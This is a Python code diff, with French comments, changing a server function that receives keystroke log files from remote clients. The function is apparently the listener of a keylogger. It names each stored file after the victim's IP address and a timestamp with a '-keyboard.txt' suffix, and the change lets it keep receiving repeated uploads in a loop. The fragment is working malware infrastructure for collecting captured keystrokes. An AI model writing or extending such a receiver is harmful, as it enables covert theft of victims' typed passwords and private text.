@@ -22,26 +22,27 @@ def recv_file_from_klg(client_sock, addr):
     bufer_size = 1024 # Pour la reception des data
     
     try:
-        _ = client_sock.recv(bufer_size).decode().strip()
-        if not _:
-            print("Aucune donée reçu fin de la connexion")
-            return
-        
-        # Generation du nom de fichier unique
-        timestamp = datetime.now().strftime("%Y%M%d_%H%M%S")
-        ip_client = addr[0].replace(".", "-")
-        unique_filename = f"{ip_client}_{timestamp}-keyboard.txt"
+        while running_thrd:
+            check_data_client = client_sock.recv(bufer_size).decode().strip()
+            if not check_data_client:
+                print("Aucune donée reçu fin de la connexion")
+                return
+            
+            # Generation du nom de fichier unique
+            timestamp = datetime.now().strftime("%Y_%M_%d %H_%M")
+            ip_client = addr[0].replace(".", "-")
+            unique_filename = f"{ip_client}_{timestamp}-keyboard.txt"
 
-        with open(unique_filename, "wb") as f:
-            print(f"Début de reception du fichier {unique_filename}")
-            while running_thrd:
-                data = client_sock.recv(bufer_size)
-                if not data or b"<END>" in data:
-                    f.write(data[:-5]) # Je supprime <END>
-                    break
-                f.write(data)
-            client_sock.sendall(b"ACK")
-            print(f"Fin de reception du fichier {unique_filename}")
+            with open(unique_filename, "wb") as f:
+                print(f"Début de reception du fichier {unique_filename}")
+                while running_thrd:
+                    data = client_sock.recv(bufer_size)
+                    if not data or b"<END>" in data:
+                        f.write(data[:-5]) # Je supprime <END>
+                        break
+                    f.write(data)
+                client_sock.sendall(b"ACK")
+                print(f"Fin de reception du fichier {unique_filename}")
     except Exception as e:
         print(f"Erreur lors de la reception du fichier : {e}")
     finally:
